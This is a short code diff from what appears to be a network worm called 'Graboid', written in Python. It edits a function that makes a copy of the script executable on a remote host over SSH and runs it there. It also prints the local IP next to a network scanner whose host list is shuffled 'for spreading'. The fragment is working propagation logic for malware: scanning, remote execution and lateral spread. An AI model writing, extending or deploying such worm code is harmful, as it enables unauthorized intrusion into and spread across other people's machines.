@@ -91,7 +91,7 @@ def tunnelexe(sshTGT, sftpTGT):
         # sshTGT.exec_command("pip install netifaces")        
         # sshTGT.exec_command("python3 -m pip install python-nmap")
         sshTGT.exec_command("chmod a+x /tmp/Graboid.py" )
-        sshTGT.exec_command("./Graboid.py")
+        sshTGT.exec_command("./tmp/Graboid.py")
         
     except:
         print(sys.exc_info()[0])
@@ -138,7 +138,9 @@ def thisIP(interface):
     if not addr == "127.0.0.1":
       ip_addr = addr
       break
+  # ip_addr = (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0]
 
+ 
   return ip_addr
 
 #find_file
@@ -179,10 +181,10 @@ def main():
     print("Interface: ", interface)
 
     ip_addr = thisIP(interface)
-
+    print(ip_addr)
     networkHosts = scanner()
     print(networkHosts)
-
+    
     networkHosts.remove(ip_addr)
     
     #suffle hosts for spreading
